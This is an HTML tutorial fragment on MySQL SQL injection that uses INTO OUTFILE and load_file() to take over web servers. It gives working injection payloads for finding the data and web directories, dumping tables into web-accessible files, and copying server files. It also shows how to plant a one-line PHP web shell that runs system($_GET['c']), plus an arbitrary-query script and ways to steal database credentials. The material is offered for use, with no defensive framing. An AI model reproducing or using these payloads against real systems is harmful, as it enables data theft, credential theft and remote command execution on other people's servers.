</head><body><b>The web directory problem</b>&nbsp; <br/>
If you define no path, INTO OUTFILE will write into the database directory.<br/>
<br/>
On MySQL 4 we can get an error message displaying the datadir:<br/>
0′ UNION SELECT load_file(‘a’),null/*<br/>
<br/>
On MySQL 5 we use:<br/>
0′ UNION SELECT @@datadir,null/*<br/>
<br/>
The default path for file writing then is datadir\databasename.<br/>
You can figure out the databasename with:<br/>
0′ UNION SELECT database(),null/*<br/>
<br/>
If you are lucky the script uses mysql_result(), mysql_free_result(), mysql_fetch_row() or similar functions and displays warning messages. Then you can easily find out the webserver directory by leaving those functions with no input that they will throw a warning message like:<br/>
<br/>
Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /web/server/path/file.php on line xxx<br/>
<br/>
To provoke an error like this try something like:<br/>
0′ AND 1=’0<br/>
<br/>
<b>create useful files</b>&nbsp;<br/>
Once you figured out the right directory you can select data and write it into a file with:<br/>
0′ UNION SELECT columnname,null FROM tablename INTO OUTFILE ‘../../web/dir/file.txt<br/>
<br/>
Or the whole data without knowing the table/column names:<br/>
1′ OR 1=1 INTO OUTFILE ‘../../web/dir/file.txt<br/>
<br/>
If you want to avoid splitting chars between the data, use INTO DUMPFILE instead of INTO OUTFILE.<br/>
<br/>
You can also combine load_file() with into outfile, like putting a copy of a file to the accessable webspace.<br/>
0′ AND 1=0 UNION SELECT load_file(‘…’) INTO OUTFILE ‘…<br/>
<br/>
In some cases I’d recommend to use<br/>
0′ AND 1=0 UNION SELECT hex(load_file(‘…’)) INTO OUTFILE ‘…<br/>
and decrypt it later with the PHP Charset Encoder, especially when reading the MySQL data files.<br/>
<br/>
Or you can write whatever you want into a file:<br/>
0′ AND 1=0 UNION SELECT ‘code’,null INTO OUTFILE ‘../../web/server/dir/file.php<br/>
<br/>
Here are some useful code examples:<br/>
// PHP SHELL<br/>
&lt;? system($_GET['c']); ?&gt;<br/>
This is a very simple one. You can find more complex ones (including file browsing and so on) on the internet.<br/>
Note that the PHP safe_mode must be turned off. Depending on OS and PHP version you can bypass the safe_mode sometimes.<br/>
<br/>
// webserver info<br/>
Gain a lot of information about the webserver configuration with:<br/>
&lt;? phpinfo(); ?&gt;<br/>
<br/>
// SQL QUERY<br/>
&lt;? ... $result = mysql_query($_GET['query']); ... ?&gt;<br/>
Try to use load_file() to get the database connection credentials, or try to include an existing file on the webserver which handles the mysql connect.<br/>
<br/>
<br/>
<br/>
Tips<br/>
At the end some notes regarding INTO OUTFILE:<br/>
&nbsp;you can’t overwrite files with INTO OUTFILE<br/>
&nbsp;INTO OUTFILE must be the last statement in the query<br/>
&nbsp;there is no way I know of to encode the pathname, so quotes are required<br/>
&nbsp;you can encode your code with char()</body></html>
